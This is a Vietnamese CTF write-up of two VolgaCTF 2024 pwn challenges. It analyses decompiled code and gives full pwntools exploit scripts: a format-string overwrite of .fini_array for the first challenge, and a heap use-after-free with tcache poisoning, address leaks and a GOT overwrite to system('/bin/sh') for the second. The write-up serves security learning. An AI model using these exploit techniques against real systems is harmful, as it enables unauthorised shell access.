---
title: VolgaCTF 2024 Qualifier
date: 2024-04-12 03-16-36
categories: [CTF]
tags: [pwn, VolgaCTF]
math: true
---

## link challenge

- Giải này mình thấy khá hay nên mình đã cố gắng write up lại. Cảm ơn `Crazyman` (Discord: `_cra2yman_`) đã chia sẻ solution.

- https://github.com/wan-04/CTF-2024/tree/main/volga

## warm_of_pon

### Source

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 v4; // [rsp+8h] [rbp-28h]
  char format[24]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 i; // [rsp+28h] [rbp-8h]
  __int64 savedregs; // [rsp+30h] [rbp+0h]
  void *retaddr; // [rsp+38h] [rbp+8h]

  setup(argc, argv, envp);
  v4 = 0LL;
  *(&savedregs - 305) = (unsigned __int64)malloc(8uLL) & 0xFFFFFFFFFFFFF000LL;
  *(_QWORD *)*(&savedregs - 305) = retaddr;
  gets(format);
  printf(format);
  for ( i = 0LL; i <= 0x20; ++i )
  {
    if ( *(_QWORD *)((i << 12) + *(&savedregs - 305)) )
      retaddr = *(void **)((i << 12) + *(&savedregs - 305));
  }
  return 0;
}
```

### Phân tích

- Chall này tồn tại 2 bug là BOF và FMT, nhưng chương trình đã copy `retaddr` là `saved rip` vào heap. Sau khi thực thi hàm `gets`, chương trình sẽ ghi lại giá trị của `saved rip`. Như vậy, nếu ta ghi đè `rip` thì cuối chương trình `retaddr` vẫn sẽ được ghi lại.

```c
  *(&savedregs - 305) = (unsigned __int64)malloc(8uLL) & 0xFFFFFFFFFFFFF000LL;
  *(_QWORD *)*(&savedregs - 305) = retaddr;
```

- Lúc giải còn trong thời gian, mình đã khá bối rối và quên mất rằng khi kết thúc chương trình, sẽ gọi một `.fini_array`.

```
0x0000000000403df0 - 0x0000000000403df8 is .fini_array
---
10:0080│+050 0x7fffffffdd60 —▸ 0x403df0 —▸ 0x401130 ◂— endbr64  // .fini_aray
11:0088│+058 0x7fffffffdd68 —▸ 0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2c0 ◂— 0x0
12:0090│+060 0x7fffffffdd70 ◂— 0x61af5347029bcff0
13:0098│+068 0x7fffffffdd78 ◂— 0x61af43036c53cff0
14:00a0│+070 0x7fffffffdd80 ◂— 0x0
... ↓     2 skipped
17:00b8│+088 0x7fffffffdd98 —▸ 0x7fffffffde28 —▸ 0x7fffffffe0b5 ◂— '/mnt/d/CTF/volga/warm_of_ponn/warm_of_pon_patched'
```

- Chúng ta cùng nhìn qua struct của `.fini_array`

```c
typedef void (*fini_t) (void);

typedef struct {
  uint32_t length;
  fini_t* array;
} __aword __attribute__((aligned(16))) .fini_array;
```

- Trong các bài thông thường, sẽ có 1 con trỏ chứa địa chỉ `array`, nhưng trong chall này sẽ không có con trỏ ấy mà thay vào đó ta sẽ có con trỏ trỏ đến `size`

```
1d:00e8│+0b8 0x7fffffffdde8 —▸ 0x403df0 —▸ 0x401130 ◂— endbr64 //base .fini_array
1e:00f0│+0c0 0x7fffffffddf0 —▸ 0x1555555552c0 ◂— 0x0 // con trỏ size
----
pwndbg> tel 0x1555555552c0
00:0000│  0x1555555552c0 ◂— 0x0 // size
01:0008│  0x1555555552c8 —▸ 0x155555555880 ◂— 0x0
02:0010│  0x1555555552d0 —▸ 0x3fe650 ◂— 0x1d
03:0018│  0x1555555552d8 —▸ 0x155555555890 —▸ 0x15555551d000 ◂— jg 0x15555551d047
```

- Ta thấy `i--` thì nếu `base + size = con trỏ win` thì ta có thể get shell

```c
__libc_csu_fini (void)
{
#ifndef LIBC_NONSHARED
  size_t i = __fini_array_end - __fini_array_start;
  while (i-- > 0)
    (*__fini_array_start [i]) ();

```

### script

```python
#!/usr/bin/python3

from pwn import *

exe = ELF('warm_of_pon_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
                b* 0x40124F

                c
                ''')
        input()


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote('')
else:
    p = process(exe.path)

GDB()

target = 0x00404070
main = 0x4011DD
fini_array = 0x403DF0
offset = target-fini_array

payload = f"%{offset}c%36$n%{exe.sym.win-offset}c%13$n".encode().ljust(0x28,b"a")+p64(target)
sl(payload)

p.interactive()

```

## ponatural_selection

### Phân tích

- Ta sẽ thấy trong hàm `add_to_chain` sẽ malloc và lưu các chunk bằng linked list theo struct sau

  ![image](/assets/2024-04-12-VolgaCTF%202024%20Qualifier/2024-04-12-03-21-32.png)

```c
int add_to_chain()
{
  char *v0; // rax
  ptr *i; // [rsp+0h] [rbp-20h]
  char *buf; // [rsp+8h] [rbp-18h]
  ssize_t v4; // [rsp+10h] [rbp-10h]

  if ( (unsigned int)count <= 2 )
  {
    ++count;
    buf = (char *)malloc(0x20uLL);
    if ( !buf )
      exit(0);
    if ( root )
    {
      for ( i = (ptr *)root; i->prev_ptr; i = (ptr *)i->prev_ptr )
        ;
      i->prev_ptr = (__int64)buf;
    }
    else
    {
      root = buf;
    }
    printf("Enter data: ");
    v4 = read(0, buf, 0x17uLL);
    if ( v4 <= 0 )
      exit(0);
    buf[v4] = 0;
    v0 = strchr(buf, 10);
    if ( v0 )
      *v0 = 0;
  }
  else
  {
    LODWORD(v0) = printf("Limit exceedance detected (%d/%d).\n", (unsigned int)count, 3LL);
  }
  return (int)v0;
}
```

- Trong hàm `remove_from_chain` sẽ thực hiện ngắt xử lý linked list và một bug là không memset chunk sau khi free. Việc này ta có thể vượt qua các check ở `change_chain_data`

```c
unsigned __int64 remove_from_chain()
{
  unsigned int v1; // [rsp+8h] [rbp-28h] BYREF
  int v2; // [rsp+Ch] [rbp-24h]
  ptr *v3; // [rsp+10h] [rbp-20h]
  ptr *v4; // [rsp+18h] [rbp-18h]
  void *ptr; // [rsp+20h] [rbp-10h]
  unsigned __int64 v6; // [rsp+28h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  v1 = 0;
  printf("Insert delete position: ");
  __isoc99_scanf("%d", &v1);
  if ( v1 < count )
  {
    if ( v1 )
    {
      v2 = 0;
      v3 = (ptr *)root;
      v4 = (ptr *)root;
      while ( v3->prev_ptr && v2 != v1 )
      {
        ++v2;
        v4 = v3;
        v3 = (ptr *)v3->prev_ptr;
      }
      v4->prev_ptr = v3->prev_ptr;
      free(v3);
    }
    else
    {
      ptr = root;
      root = (char *)*((_QWORD *)root + 3);
      free(ptr);
    }
    --count;
  }
  else
  {
    printf("Out of bounds detected (%d > %d).\n", v1, (unsigned int)(count - 1));
  }
  return v6 - __readfsqword(0x28u);
}
```

- Trong hàm `change_chain_data` sẽ thực hiện edit data. Tuy nhiên hàm này kiểm tra 1 node có tồn tại hay không khi duyệt qua các node mà không kiểm tra count.

```c
unsigned __int64 change_chain_data()
{
  int v1; // [rsp+0h] [rbp-20h] BYREF
  int v2; // [rsp+4h] [rbp-1Ch]
  ptr *buf; // [rsp+8h] [rbp-18h]
  ssize_t v4; // [rsp+10h] [rbp-10h]
  unsigned __int64 v5; // [rsp+18h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  v1 = 0;
  printf("Insert change position: ");
  __isoc99_scanf("%d", &v1);
  v2 = 0;
  for ( buf = (ptr *)root; buf->prev_ptr && v2 != v1; buf = (ptr *)buf->prev_ptr )
    ++v2;
  printf("Enter data: ");
  v4 = read(0, buf, 0x17uLL);
  if ( v4 <= 0 )
    exit(0);
  buf->data[v4] = 0;
  return v5 - __readfsqword(0x28u);
```

> Kết hợp với bug ở hàm `remove_from_chain` ta có thể sử dụng lại data của node bị xoá khiến cho việc check ở `change_chain_data` OOB và UAF

### Khai thác

- Phần khai thác ban đầu mình đọc solution của `Crazyman` nhưng không hiểu. Do đó mình đã tự là lại và sửa dụng lại một số phần của anh ấy. Mình sẽ để solution của `Crazyman` ở cuối
- Phần khai thác của mình khá dài nên bạn có thể bỏ qua

#### Chuẩn bị

```python
def menu(choice):
    ru(">> ")
    sl(str(choice))

def add(content):
    menu(1)
    ru("Enter data: ")
    s(content)

def delete(index):
    menu(2)
    ru("Insert delete position: ")
    sl(str(index))

def show():
    menu(3)

def edit(index,content):
    menu(4)
    ru("Insert change position: ")
    sl(str(index))
    ru("Enter data: ")
    s(content)
def clear_func():
    menu(5)
```

#### leak heap

- Phần này theo hiểu biết của tôi, anh ấy cố gắng làm đầy tcache bằng cách ghi đè biến count, bằng cách này chương trình sẽ hiểu tcache đầy (7 chunk) và sẽ bỏ vào unsorted bin

```python
add("Wolf")
add("Lion")
add("Tiger")
delete(1)  #Wolf -> Tiger
add("aaaa") # Wolf -> Tiger -> aaaa -> Tiger
delete(1) #  Wolf -> aaaa -> free chunk -> aaaa, count 2
show()
ru('aaaa -> ')
key = u64(rn(5).ljust(8,b'\x00'))
heap_base = key << 12
lg("heap_base")
delete(1)
delete(0)
edit(3,p64(key^(heap_base+0x40)))
clear_func()
add("aaaa")
clear_func()
add("aaaa")
clear_func()
add(p64(0)+p64(0x251)+b"\x07\x00"*3+b"\x07")
clear_func()
```

![image](/assets/2024-04-12-VolgaCTF%202024%20Qualifier/2024-04-12-06-46-16.png)

#### setup for big chunk

- ghi đè size một chunk nào đó. Ở đây tôi chọn chunk đầu tiên trong heap

```python
add("Wolf")
add("Lion")
add("Tiger")
delete(1)  #Wolf -> Tiger
add("aaaa") # Wolf -> Tiger -> aaaa -> Tiger
delete(1) #  Wolf -> aaaa -> free chunk -> aaaa, count 2
delete(1)
delete(0)
edit(3,p64(key^(heap_base+0x290)))
clear_func()
add("aaaa")
clear_func()
add("aaaa")
clear_func()
add(p64(0)+p64(0x241))
clear_func()
```

![](/assets/2024-04-12-VolgaCTF%202024%20Qualifier/2024-04-12-06-48-24.png)

- tiếp theo sẽ thêm 1 số chunk. Mục đích là để vượt qua security check (check chunk trước và chunk sau của chunk được free)
- không hợp lệ
  ![image](/assets/2024-04-12-VolgaCTF%202024%20Qualifier/2024-04-12-06-52-04.png)
- hợp lệ
  ![image](/assets/2024-04-12-VolgaCTF%202024%20Qualifier/2024-04-12-06-52-44.png)

#### leak libc

- Tôi không nhớ rõ nhưng có vẻ ở bản libc này sẽ không kiểm tra size chunk được lấy ra có đúng với size malloc, nghĩa là ở tcache 0x30 có chunk size 0x241. (hoặc cũng có thể chunk được malloc lớn hơn với size yêu cầu nên không gây ra)

```python
add("Wolf")
add("Lion")
add("Tiger")
delete(1)  #Wolf -> Tiger
add("aaaa") # Wolf -> Tiger -> aaaa -> Tiger
delete(1) #  Wolf -> aaaa -> free chunk -> aaaa, count 2
delete(1)
delete(0)
edit(3,p64(key^(heap_base+0x2a0)))

clear_func()
add("aaaa")
clear_func()
add("aaaa")
clear_func()
add("bbbb")
delete(0) # free
clear_func()
add("aaaa")
show()
ru("->")
ru("-> ")
libc_base = u64(rn(6).ljust(8,b'\x00'))-0x1f6ce0
lg("libc_base")
stdout_addr=0x1f5e20+libc_base
lg("stdout_addr")
```

- Làm rỗng unsorted bin

```python
for i in range(15):
    clear_func()
    add("Wolf")
clear_func()
```

#### leak elf

- Vì RELRO tắt nên ta sẽ overwrite GOT.
- Có một biến là `stdout` trong libc có lưu địa chỉ ELF tuy nhiên biến đó ở vùng địa chỉ không ghi được. Do vậy ta sẽ sử dụng option 3 để leak
- Hàm `print_chain`:

```c
int print_chain()
{
  int v1; // [rsp+4h] [rbp-Ch]
  ptr *i; // [rsp+8h] [rbp-8h]

  if ( !root )
    return puts("Empty selction.");
  v1 = 0;
  for ( i = root; i->next_ptr && v1 != 3; i = (ptr *)i->next_ptr )
  {
    ++v1;
    printf("%s -> ", i->data);
  }
  return printf("%s -> 0\n", i->data);
}
```

- Nhìn qua điều kiện `i = root; i->next_ptr && v1 != 3; i = (ptr *)i->next_ptr`. Chúng rất dễ gây ra lỗi. Điều kiện `i->next_ptr` khó để khiến hàm `print` này ngừng, việc truy cập vào địa chỉ không đúng sẽ gây lỗi.
  ![](/assets/2024-04-12-VolgaCTF%202024%20Qualifier/2024-04-12-07-16-22.png)

- Do vậy ta sẽ dựa vào điều kiện `v1 != 3` để leak.
- Ta sẽ cần setup các chunk sao cho chunk leak sẽ cuối và hàm `print` ngừng in.
  ![](/assets/2024-04-12-VolgaCTF%202024%20Qualifier/2024-04-12-07-17-51.png)
- Ở đây ta sẽ setup 2 chunk.

```python
#leak
add("Wolf")
add("Lion")
add("Tiger")
delete(1)  #Wolf -> Tiger
add("aaaa") # Wolf -> Tiger -> aaaa -> Tiger
delete(1) #  Wolf -> aaaa -> free chunk -> aaaa, count 2
delete(1)
delete(0)
edit(3,p64(key^(heap_base+0x6d0)))
clear_func()
add("aaaa")
clear_func()
add("aaaa")
clear_func()
add(flat(0, stdout_addr))
clear_func()
#heap
add("Wolf")
add("Lion")
add("Tiger")
delete(1)  #Wolf -> Tiger
add("aaaa") # Wolf -> Tiger -> aaaa -> Tiger
delete(1) #  Wolf -> aaaa -> free chunk -> aaaa, count 2
delete(1)
delete(0)
edit(3,p64(key^(heap_base+0x700)))
clear_func()
add("aaaa")
clear_func()
add("aaaa")
clear_func()
add(flat(0, heap_base+0x6c0))
clear_func()
#heap
# vì +0x720 có ptr->next_ptr đến 0x700 nên ta không cần setup 3 chunk heap
add("Wolf")
add("Lion")
add("Tiger")
delete(1)  #Wolf -> Tiger
add("aaaa") # Wolf -> Tiger -> aaaa -> Tiger
delete(1) #  Wolf -> aaaa -> free chunk -> aaaa, count 2
delete(1)
delete(0)
edit(3,p64(key^(heap_base+0x720)))
clear_func()
add("aaaa")
clear_func()
add("aaaa")
clear_func()
add(flat(0))
lg("stdout_addr")
# get addr
show()
ru("-> ")
ru("-> ")
ru("-> ")
elf_base=u64(rn(6).ljust(8,b'\x00'))-0x4060
lg("elf_base")
```

#### overwrite GOT

- Đến đây là dễ rồi chúng ta sẽ ghi đè `got@free` và free một chunk '/bin/sh'

```python
stcmp_got=0x4028+elf_base
sys=libc_base+libc.sym['system']

clear_func()

add("Wolf")
add("Lion")
add("Tiger")
delete(1)  #Wolf -> Tiger
add("aaaa") # Wolf -> Tiger -> aaaa -> Tiger
delete(1) #  Wolf -> aaaa -> free chunk -> aaaa, count 2
delete(1)
delete(0)
edit(3,p64(key^(0x555555558000)))
clear_func()
add("aaaa")
clear_func()
add("aaaa")
clear_func()
add(flat(sys, libc_base+libc.sym.puts))
clear_func()

add("/bin/sh")
delete(0)
p.interactive()

```

### script

- solution của @Crazyman

```python
from pwn import *
context.arch='amd64'
context.log_level='debug'
p=remote("172.104.134.194",1337)
#p=process('./ponatural_selection')
libc=ELF('./libc.so.6')
s = lambda data : p.send(data)
sl = lambda data : p.sendline(data)
sa = lambda text, data : p.sendafter(text, data)
sla = lambda text, data : p.sendlineafter(text, data)
r = lambda : p.recv()
rn = lambda x  : p.recvn(x)
ru = lambda text : p.recvuntil(text)
dbg = lambda text=None  : gdb.attach(p, text)
uu32 = lambda : u32(p.recvuntil(b"\xff")[-4:].ljust(4, b'\x00'))
uu64 = lambda : u64(p.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
lg = lambda s : info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
pr = lambda s : print('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
def mydbg():
    gdb.attach(p,"b *$rebase(0x0012AD)")
    pause()

def menu(choice):
    ru(">> ")
    sl(str(choice))

def add(content):
    menu(1)
    ru("Enter data: ")
    s(content)

def delete(index):
    menu(2)
    ru("Insert delete position: ")
    sl(str(index))

def show():
    menu(3)

def edit(index,content):
    menu(4)
    ru("Insert change position: ")
    sl(str(index))
    ru("Enter data: ")
    s(content)
def clear_func():
    menu(5)
add("Wolf")
add("Lion")
add("Tiger")
delete(1)  #Wolf -> Tiger
add("aaaa") # Wolf -> Tiger -> aaaa -> Tiger
delete(1) #  Wolf -> aaaa -> free chunk -> aaaa, count 2
show()
ru('aaaa -> ')
key = u64(rn(5).ljust(8,b'\x00'))
heap_base = key << 12
lg("heap_base")
delete(1)
delete(0)
edit(3,p64(key^(heap_base+0x40)))
clear_func()
add("aaaa")
clear_func()
add("aaaa")
clear_func()
add(p64(0)+p64(0x251)+b"\x07\x00"*3+b"\x07")
clear_func()


add("Wolf")
add("Lion")
add("Tiger")
delete(1)  #Wolf -> Tiger
add("aaaa") # Wolf -> Tiger -> aaaa -> Tiger
delete(1) #  Wolf -> aaaa -> free chunk -> aaaa, count 2
delete(1)
delete(0)
edit(3,p64(key^(heap_base+0x290)))
clear_func()
add("aaaa")
clear_func()
add("aaaa")
clear_func()
add(p64(0)+p64(0x241))
clear_func()

add("Wolf")
add("Lion")
add("Tiger")
clear_func()
add("Wolf")
add("Lion")
add("Tiger")
clear_func()


add("Wolf")
add("Lion")
add("Tiger")
delete(1)  #Wolf -> Tiger
add("aaaa") # Wolf -> Tiger -> aaaa -> Tiger
delete(1) #  Wolf -> aaaa -> free chunk -> aaaa, count 2
delete(1)
delete(0)
edit(3,p64(key^(heap_base+0x2e0)))
clear_func()
add("aaaa")
clear_func()
add("aaaa")
clear_func()
add(p64(0)+p64(heap_base+0x2e0))
clear_func()


add("Wolf")
add("Lion")
add("Tiger")
delete(1)  #Wolf -> Tiger
add("aaaa") # Wolf -> Tiger -> aaaa -> Tiger
delete(1) #  Wolf -> aaaa -> free chunk -> aaaa, count 2
delete(1)
delete(0)
edit(3,p64(key^(heap_base+0x3a0)))
clear_func()
add("aaaa")
clear_func()
add("aaaa")
clear_func()
add(p64(0)+p64(heap_base+0x3a0))
clear_func()

add("Wolf")
add("Lion")
add("Tiger")
delete(1)  #Wolf -> Tiger
add("aaaa") # Wolf -> Tiger -> aaaa -> Tiger
delete(1) #  Wolf -> aaaa -> free chunk -> aaaa, count 2
delete(1)
delete(0)
edit(3,p64(key^(heap_base+0x2a0)))
clear_func()
add("aaaa")
clear_func()
add("aaaa")
clear_func()
add("aaaaa")
delete(0)
clear_func()
add("aaaa")
show()
ru("->")
ru("-> ")
libc_base = u64(rn(6).ljust(8,b'\x00'))-0x1f6ce0
lg("libc_base")
stdout_addr=0x1f5e20+libc_base
lg("stdout_addr")

edit(3,p64(0)+p64(stdout_addr))


show()
ru("-> ")
ru("-> ")
ru("-> ")
elf_base=u64(rn(6).ljust(8,b'\x00'))-0x4060
lg("elf_base")

stcmp_got=0x4028+elf_base
sys=libc_base+libc.sym['system']

clear_func()
add("aaaa")
clear_func()
add("aaaa")
clear_func()
add("/bin/sh\x00")
edit(2,p64(0)+p64(stcmp_got))
edit(2,p64(sys)[:7])

menu(6)

p.interactive()
```

- script của tôi

```python
#!/usr/bin/python3

from pwn import *

exe = ELF('ponatural_selection_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''


                c
                ''')
        input()


s = lambda data : p.send(data)
sl = lambda data : p.sendline(data)
sa = lambda text, data : p.sendafter(text, data)
sla = lambda text, data : p.sendlineafter(text, data)
r = lambda : p.recv()
rn = lambda x  : p.recvn(x)
ru = lambda text : p.recvuntil(text)
dbg = lambda text=None  : gdb.attach(p, text)
uu32 = lambda : u32(p.recvuntil(b"\xff")[-4:].ljust(4, b'\x00'))
uu64 = lambda : u64(p.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
lg = lambda s : info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
pr = lambda s : print('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))


if args.REMOTE:
    p = remote('')
else:
    p = process(exe.path)

GDB()

def menu(choice):
    ru(">> ")
    sl(str(choice))

def add(content):
    menu(1)
    ru("Enter data: ")
    s(content)

def delete(index):
    menu(2)
    ru("Insert delete position: ")
    sl(str(index))

def show():
    menu(3)

def edit(index,content):
    menu(4)
    ru("Insert change position: ")
    sl(str(index))
    ru("Enter data: ")
    s(content)
def clear_func():
    menu(5)
add("Wolf")
add("Lion")
add("Tiger")
delete(1)  #Wolf -> Tiger
add("aaaa") # Wolf -> Tiger -> aaaa -> Tiger
delete(1) #  Wolf -> aaaa -> free chunk -> aaaa, count 2
show()
ru('aaaa -> ')
key = u64(rn(5).ljust(8,b'\x00'))
heap_base = key << 12
lg("heap_base")
delete(1)
delete(0)
edit(3,p64(key^(heap_base+0x40)))
clear_func()
add("aaaa")
clear_func()
add("aaaa")
clear_func()
add(p64(0)+p64(0x251)+b"\x07\x00"*3+b"\x07")
clear_func()


add("Wolf")
add("Lion")
add("Tiger")
delete(1)  #Wolf -> Tiger
add("aaaa") # Wolf -> Tiger -> aaaa -> Tiger
delete(1) #  Wolf -> aaaa -> free chunk -> aaaa, count 2
delete(1)
delete(0)
edit(3,p64(key^(heap_base+0x290)))
clear_func()
add("aaaa")
clear_func()
add("aaaa")
clear_func()
add(p64(0)+p64(0x241))
clear_func()

add("Wolf")
add("Lion")
add("Tiger")
clear_func()
add("Wolf")
add("Lion")
add("Tiger")
clear_func()



add("Wolf")
add("Lion")
add("Tiger")
delete(1)  #Wolf -> Tiger
add("aaaa") # Wolf -> Tiger -> aaaa -> Tiger
delete(1) #  Wolf -> aaaa -> free chunk -> aaaa, count 2
delete(1)
delete(0)
edit(3,p64(key^(heap_base+0x2a0)))

clear_func()
add("aaaa")
clear_func()
add("aaaa")
clear_func()
add("bbbb")
delete(0)
clear_func()
add("aaaa")
show()
ru("->")
ru("-> ")
libc_base = u64(rn(6).ljust(8,b'\x00'))-0x1f6ce0
lg("libc_base")
stdout_addr=0x1f5e20+libc_base
lg("stdout_addr")
for i in range(15):
    clear_func()
    add("Wolf")
clear_func()

add("Wolf")
add("Lion")
add("Tiger")
delete(1)  #Wolf -> Tiger
add("aaaa") # Wolf -> Tiger -> aaaa -> Tiger
delete(1) #  Wolf -> aaaa -> free chunk -> aaaa, count 2
delete(1)
delete(0)
edit(3,p64(key^(heap_base+0x6d0)))
clear_func()
add("aaaa")
clear_func()
add("aaaa")
clear_func()
add(flat(0, stdout_addr))
clear_func()

add("Wolf")
add("Lion")
add("Tiger")
delete(1)  #Wolf -> Tiger
add("aaaa") # Wolf -> Tiger -> aaaa -> Tiger
delete(1) #  Wolf -> aaaa -> free chunk -> aaaa, count 2
delete(1)
delete(0)
edit(3,p64(key^(heap_base+0x700)))
clear_func()
add("aaaa")
clear_func()
add("aaaa")
clear_func()
add(flat(0, heap_base+0x6c0))
clear_func()

add("Wolf")
add("Lion")
add("Tiger")
delete(1)  #Wolf -> Tiger
add("aaaa") # Wolf -> Tiger -> aaaa -> Tiger
delete(1) #  Wolf -> aaaa -> free chunk -> aaaa, count 2
delete(1)
delete(0)
edit(3,p64(key^(heap_base+0x720)))
clear_func()
add("aaaa")
clear_func()
add("aaaa")
clear_func()
add(flat(0))
lg("stdout_addr")

show()
ru("-> ")
ru("-> ")
ru("-> ")
elf_base=u64(rn(6).ljust(8,b'\x00'))-0x4060
lg("elf_base")

stcmp_got=0x4028+elf_base
sys=libc_base+libc.sym['system']

clear_func()

add("Wolf")
add("Lion")
add("Tiger")
delete(1)  #Wolf -> Tiger
add("aaaa") # Wolf -> Tiger -> aaaa -> Tiger
delete(1) #  Wolf -> aaaa -> free chunk -> aaaa, count 2
delete(1)
delete(0)
edit(3,p64(key^(0x555555558000)))
clear_func()
add("aaaa")
clear_func()
add("aaaa")
clear_func()
add(flat(sys, libc_base+libc.sym.puts))
clear_func()

add("/bin/sh")
delete(0)


p.interactive()
```

## Lời kết

- Cảm ơn @Crazyman đã chia sẽ solution.
- Nếu có gì sai xót, các bạn có thể nhắn tin cho tôi.
